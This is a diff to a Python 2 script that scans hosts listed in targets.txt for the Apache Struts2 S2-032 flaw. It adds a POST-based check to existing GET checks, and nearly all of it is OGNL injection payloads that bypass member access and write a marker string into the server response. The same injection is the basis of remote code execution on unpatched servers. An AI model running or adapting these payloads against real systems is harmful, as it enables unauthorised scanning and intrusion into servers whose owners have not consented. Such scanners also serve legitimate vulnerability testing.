@@ -31,11 +31,25 @@ def verify(url, attack):
 	except:
 		pass
 
+def verifyPost(url, payload):
+	#proxies = {'http': 'http://127.0.0.1:8080','https': 'http://127.0.0.1:8080',}	
+	urls = url
+	header = {"Content-Type" : "application/x-www-form-urlencoded"}
+	try:
+		post = requests.post(urls, data=payload, headers=header)
+		#get = requests.post(urls, data=payload, headers=header, proxies=proxies, verify=False)
+		if 'Struts2 S2-032 Vulnerable' in post.text:
+			print "Vulnerable"
+	except:
+		pass
+
 attack = [
 "?method:%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%2C%23test%3D%23context.get%28%23parameters.res%5B0%5D%29.getWriter%28%29%2C%23test.println%28%23parameters.command%5B0%5D%29%2C%23test.flush%28%29%2C%23test.close&res=com.opensymphony.xwork2.dispatcher.HttpServletResponse&command=%23%23%23Struts2 S2-032 Vulnerable%23%23%23",
 "?method:%23%5fmemberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%2C%23test%3D%23context.get%28%23parameters.res%5B0%5D%29.getWriter%28%29%2C%23test.println%28%23parameters.command%5B0%5D%29%2C%23test.flush%28%29%2C%23test.close&res=com.opensymphony.xwork2.dispatcher.HttpServletResponse&command=%23%23%23Struts2 S2-032 Vulnerable%23%23%23",
 "?method:%23%5FmemberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%2C%23test%3D%23context.get%28%23parameters.res%5B0%5D%29.getWriter%28%29%2C%23test.println%28%23parameters.command%5B0%5D%29%2C%23test.flush%28%29%2C%23test.close&res=com.opensymphony.xwork2.dispatcher.HttpServletResponse&command=%23%23%23Struts2 S2-032 Vulnerable%23%23%23"
 ]
+
+payload = "method:%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%2C%23test%3D%23context.get%28%23parameters.res%5B0%5D%29.getWriter%28%29%2C%23test.println%28%23parameters.command%5B0%5D%29%2C%23test.flush%28%29%2C%23test.close&res=com.opensymphony.xwork2.dispatcher.HttpServletResponse&command=%23%23%23Struts2 S2-032 Vulnerable%23%23%23"
 
 if __name__ == "__main__":
 	f = open('targets.txt', 'r')
@@ -48,6 +62,7 @@ if __name__ == "__main__":
 		verify(url, attack[0])
 		verify(url, attack[1])
 		verify(url, attack[2])
+		verifyPost(url, payload)
 		print "===================="
 		time.sleep(1)
 	
